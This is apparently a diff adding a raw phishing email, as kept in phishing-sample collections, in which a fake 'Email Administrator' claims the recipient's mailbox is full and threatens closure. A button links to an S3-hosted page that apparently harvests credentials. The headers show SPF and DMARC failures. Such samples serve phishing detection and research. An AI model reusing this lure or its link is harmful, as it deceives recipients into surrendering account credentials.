@@ -1,0 +1,125 @@
+Return-Path: admin@domain.com
+Delivered-To: jose@monkey.org
+X-FDA: 78276980460.43.3A3B85C
+Received: from mail0.lamidey-noury.cam (mail0.lamidey-noury.cam [185.77.129.132])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id 951A0180003B1
+	for <jose@monkey.org>; Mon, 21 Jun 2021 07:59:09 +0000 (UTC)
+From: Email Administrator <admin@domain.com>
+To: jose@monkey.org
+Subject: Email Account Closure
+Date: 21 Jun 2021 07:59:08 +0000
+Message-ID: <20210621075907.E5C7AACBF5C0EA89@domain.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=4.80
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=none;
+	dmarc=fail reason="No valid SPF, No valid DKIM" header.from=domain.com (policy=none);
+	spf=fail (imf08.b.hostedemail.com: domain of admin@domain.com does not designate 185.77.129.132 as permitted sender) smtp.mailfrom=admin@domain.com
+X-Stat-Signature: sb3gdaxbodcp8xz68kudbo34pi44qqdg
+X-Rspamd-Queue-Id: 951A0180003B1
+X-Rspamd-Server: rspam04
+X-HE-Tag: 1624262349-663454
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 44
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P><BR></P>
+<DIV>
+<table style=3D"FONT-SIZE: 15px; MAX-WIDTH: 516px; MIN-WIDTH: 220px; COLOR:=
+ rgb(32,31,30); PADDING-BOTTOM: 20px; font-variant-numeric: inherit; font-v=
+ariant-east-asian: inherit; font-stretch: inherit" cellspacing=3D"0" cellpa=
+dding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"WIDTH: 8px" width=3D"8"><BR></TD>
+<td>
+<DIV style=3D"BORDER-TOP: rgb(218,220,224) thin solid; BORDER-RIGHT: rgb(21=
+8,220,224) thin solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: rgb(218,220=
+,224) thin solid; COLOR: ; PADDING-BOTTOM: 36px; PADDING-TOP: 40px; PADDING=
+-LEFT: 20px; BORDER-LEFT: rgb(218,220,224) thin solid; MARGIN: 0px; PADDING=
+-RIGHT: 20px; border-radius: 8px" align=3Dcenter>
+<DIV style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Google Sans",Roboto,Rob=
+otoDraft,Helvetica,Arial,sans-serif,serif,EmojiFont; BORDER-RIGHT-WIDTH: 0p=
+x; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: rgb(218,220=
+,224) thin solid; BORDER-LEFT-COLOR: ; COLOR: ; PADDING-BOTTOM: 24px; PADDI=
+NG-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-RIGHT-COLOR: ; LINE-HEI=
+GHT: 32px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit=
+'>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 24px; FONT-FAMILY: inherit=
+; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0=
+px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARG=
+IN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">=
+System Administrator</DIV>
+<table style=3D"MARGIN-TOP: 8px" align=3D"center">
+<TBODY>
+<TR style=3D"LINE-HEIGHT: normal">
+<td style=3D"PADDING-RIGHT: 8px" align=3D"right">Quota Update : jose@monkey=
+=2Eorg</TD>
+<td><BR></TD></TR></TBODY></TABLE></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: Roboto-=
+Regular,Helvetica,Arial,sans-serif,serif,EmojiFont; BORDER-RIGHT-WIDTH: 0px=
+; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 20=
+px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">Your =
+jose@monkey.org Mailbox is 98% Full&nbsp;and&nbsp;has exceeded its quota li=
+mit of&nbsp;sending and receiving Incoming messages.<BR>
+</DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: Roboto-=
+Regular,Helvetica,Arial,sans-serif,serif,EmojiFont; BORDER-RIGHT-WIDTH: 0px=
+; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 20=
+px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">Updat=
+e&nbsp;Your&nbsp;Mailbox quota to&nbsp;<FONT color=3D#ff0000><B>5GB</B></FO=
+NT>
+ &nbsp;to avoid Incoming Message loss&nbsp;and Email Account&nbsp;Closure.<=
+BR>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDI=
+NG-TOP: 32px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TO=
+P-WIDTH: 0px">
+<A style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Google Sans",Roboto,Robot=
+oDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN:=
+ baseline; BORDER-BOTTOM-WIDTH: 0px; MIN-WIDTH: 90px; COLOR: rgb(255,255,25=
+5); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px; MARGIN: 0p=
+x; DISPLAY: inline-block; LINE-HEIGHT: 16px; PADDING-RIGHT: 24px; BORDER-TO=
+P-WIDTH: 0px; BACKGROUND-COLOR: rgb(65,132,243); font-stretch: inherit; bor=
+der-radius: 5px'=20
+href=3D"https://opynewport4457.s3-ap-northeast-1.amazonaws.com/index.html#j=
+ose@monkey.org" rel=3D"noreferrer noopener" target=3D_blank data-saferedire=
+cturl=3D"">Update Your jose@monkey.org Quota</A></DIV><BR>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; FONT-FAMILY: inherit=
+; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0=
+px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARG=
+IN: 0px; LETTER-SPACING: 0px; LINE-HEIGHT: 16px; PADDING-RIGHT: 0px; BORDER=
+-TOP-WIDTH: 0px; font-stretch: inherit"><BR></DIV></DIV></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDI=
+NG-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP=
+-WIDTH: 0px">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 11px; FONT-FAMILY: Roboto-=
+Regular,Helvetica,Arial,sans-serif,serif,EmojiFont; BORDER-RIGHT-WIDTH: 0px=
+; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTT=
+OM: 0px; TEXT-ALIGN: center; PADDING-TOP: 12px; PADDING-LEFT: 0px; MARGIN: =
+0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-str=
+etch: inherit">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDI=
+NG-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP=
+-WIDTH: 0px">You received this email from our Webmaster for monkey.org Acco=
+unt and services.</DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; DIREC=
+TION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT:=
+ 0px; BORDER-TOP-WIDTH: 0px">&copy; 2021</DIV></DIV></DIV></TD></TR></TBODY=
+></TABLE></DIV></BODY></HTML>
+
